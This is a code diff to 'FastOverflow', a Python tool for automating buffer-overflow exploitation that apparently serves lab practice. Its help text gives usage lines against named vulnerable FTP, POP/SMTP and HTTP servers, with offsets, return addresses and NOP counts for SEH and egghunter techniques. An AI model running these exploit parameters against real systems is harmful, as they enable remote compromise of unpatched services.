@@ -67,9 +67,6 @@ class FastOverflow:
 
     def test_badchars(self):
 
-        adapter = System.get_adapter(self.config)
-        inject_func = getattr(adapter, 'inject')
-
         bads = System.input("[+] Badchars detected : " + ",".join(System.badchars) + " Additional Badchars? Separate multiple HEX (without 0x) by commas: ")
 
         if ',' in bads:
@@ -165,8 +162,8 @@ def help():
           "Ability FTP Server  ./fast_overflow.py -h 172.16.18.144 -p 21 -f stor -m ftp -o windows -U ftp -P ftp\r\n" # : 968, 33674232, 77fab127, 32 NOPs\n\r"
           "SLMail              ./fast_overflow.py -h 172.16.18.144 -p 110 -m popsmtp -o windows -f pass\r\n" # : 2606, 7608BCCF, 77fab127, 16 NOPs\n\r")
           "Video Players       ./fast_overflow.py -m file -o windows -i 172.16.18.1 -l 7777\r\n"
-          "Konica Minolta      ./fast_overflow.py -h 172.16.18.138 -p 21 -o windows -m ftp -f cwd\r\n" # : 1037, 1220401E, 8 NOPs\n\r"
-          "Kolibri             ./fast_overflow.py -h 172.16.18.144 -p 8080 -o windows -m http -f uri -v head\r\n" # : 515, 32724131, 7CA58265, 011EFB28, 011EFAF4, 8 NOPs\n\r"# )
+          "Konica Minolta      ./fast_overflow.py -h 172.16.18.138 -p 21 -o windows -m ftp -f cwd\r\n" # SEH : 1037, 1220401E, 8 NOPs\n\r"
+          "Kolibri             ./fast_overflow.py -h 172.16.18.144 -p 8080 -o windows -m http -f uri -v head\r\n" # EggHunting : 515, 32724131, 7CA58265, 011EFB28, 011EFAF4, 8 NOPs\n\r"# )
            );
 
     sys.exit(1)
@@ -178,7 +175,7 @@ def main(args):
     print("")
     print("#" * 100)
     print("")
-    print("# FastOverflow v0.1 - A toolkit for automating Buffer Overflow process")
+    print("# FastOverflow v1.0-rc - A toolkit for automating Buffer Overflow process")
     print("# Currently supporting Vanilla, SEH Bypass, EggHunter through HTTP, FTP, POP/SMTP and File")
     print("")
     print("# By Daniel (daniel@zillius.com.br) ")
